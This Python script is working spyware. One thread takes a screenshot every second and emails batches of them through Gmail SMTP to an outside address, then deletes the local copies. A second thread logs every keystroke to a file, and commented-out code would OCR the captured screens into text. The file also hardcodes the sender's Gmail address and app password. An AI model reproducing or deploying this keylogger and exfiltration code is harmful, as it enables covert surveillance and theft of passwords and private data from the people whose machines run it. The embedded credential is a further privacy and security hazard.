import logging
import os
import re
import shutil
import smtplib
import threading
import time
import random
from email.message import EmailMessage
# from tkinter.tix import DisplayStyle
import csv
import pyautogui
from PIL import Image
from pip import main
from pynput.keyboard import Key, Listener
import pytesseract



def infiniteloop1():
    while True:
        def send_mail():
            try:
                msg = EmailMessage()
                msg["From"] = 'friendb693@gmail.com'
                msg["To"] = 'anubhabdutta941@gmail.com'
                msg["Subject"] = "Tempshots"

                body = "Here you go!"
                msg.set_content(body)

                images = os.listdir("Tempshots")
                path = "C:\\Tempshots\\"
                for image in images:
                    file = open(path+image, "rb")
                    data = file.read()
                    file_name = file.name
                    msg.add_attachment(data, maintype = 'image', subtype = "png", filename = file_name)
                    file.close()

                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.ehlo()
                server.starttls()
                server.login('friendb693@gmail.com', 'aacxmvpgshxymrqe')
                server.send_message(msg)

                server.close()
                shutil.rmtree("Tempshots")
            except Exception as mail_error:
                shutil.rmtree("Tempshots")
                pass

        count = 0
        #counter = 0
        os.chdir("C:\\")
        if "Tempshots" in os.listdir("C:"):
            send_mail()
        else:
            os.mkdir("C:Tempshots")
            

        while True:
            if "Tempshots" not in os.listdir("C:"):
                os.mkdir('C:Tempshots')
            pic = pyautogui.screenshot("C:\\Tempshots\\Screenshot_"+str(count)+".png")
            
           
            count += 1
            #if (count - counter) > 31:
            if count >= 30:
                send_mail()
                
                count = 0
            time.sleep(1)
    
def infiniteloop2():
    while True:
        log_dir = "C:\\Users\\91704\\Desktop\\logger\\key\\"

        logging.basicConfig(filename=(log_dir + "keylogs.txt"),
            level=logging.DEBUG, format='%(asctime)s: %(message)s')

        def on_press(key):
            logging.info(str(key))

        with Listener(on_press=on_press) as listener:
            listener.join()

# def infiniteloop3():
#     while True:
#         #random_time = random.randint(1, 5)
#         time.sleep(60)
#         myScreenshot = pyautogui.screenshot("C:\\Users\\91704\\Desktop\\logger\\Images\\"+str(time.time())+".png")
        
        
# def infiniteloop3():
#     while True:
#         img_dir = 'C:\\Tempshots\\'
#         os.chdir(img_dir)
#         for img_file in os.listdir(img_dir):
#           if img_file.endswith(".png"):
#             texts = str(((pytesseract.image_to_string(Image.open(img_file)))))
#             text = texts.replace('-\n', '')  
#             print(texts)
#             img_file = img_file[:-4]
#             for text in texts:
#                 file = img_file + ".txt"
#             #          create the new file with "w+" as open it
#                 with open(file, "w+") as f:
#                     # for texts in docs:
#                             # write each element in my_list to file
#                         f.write(texts)
#                         print(file)   

        
thread1 = threading.Thread(target=infiniteloop1)
thread1.start()

thread2 = threading.Thread(target=infiniteloop2)
thread2.start()

# thread3 = threading.Thread(target=infiniteloop3)
# thread3.start()